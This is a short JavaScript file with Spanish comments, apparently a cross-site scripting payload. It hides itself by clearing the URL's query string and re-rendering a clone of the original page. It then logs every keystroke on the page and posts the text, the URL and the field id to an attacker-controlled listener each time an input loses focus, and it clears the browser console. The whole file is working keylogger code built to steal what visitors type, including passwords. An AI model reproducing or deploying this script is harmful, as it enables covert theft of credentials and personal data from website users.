//Esto lo dejo así para cambiarlo por consola
var https_listener_for_logging = 'https://listener.changeme'
var log = ''
var ignoredKeys = ['Shift', 'CapsLock', 'Tab', 'Control', 'Alt']
document.addEventListener('DOMContentLoaded', function () {
    // Borramos el contenido para que parezca que sigue cargando
    document.body.innerHTML = '';
    // Esto cambia la URL que muestra el navegador, para que no se vea el payload
    var newUrl = window.location.href.split('?')[0];
    history.pushState({ path: newUrl }, '', newUrl);

    //Todo esto clona la web original
    fetch(newUrl)
        .then(response => { return response.text() })
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, "text/html");
            document.body.innerHTML = doc.body.innerHTML;
            document.head.innerHTML = doc.head.innerHTML;
        }).then(() => {
            //Finalmente agregamos el keylogger
            var inputs = document.querySelectorAll('input');
            inputs.forEach(i =>
                i.addEventListener("blur", (event) => {
                    fetch(https_listener_for_logging, {
                        method: "POST", body: JSON.stringify({ "log": log, 'url' : newUrl, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() }),
                    })
                    log = ''
                })
            );

            window.addEventListener("keydown", function (e) {
                if (!ignoredKeys.includes(e.key))
                    log = log + e.key
            });
            console.clear();
        })
        .catch();
});
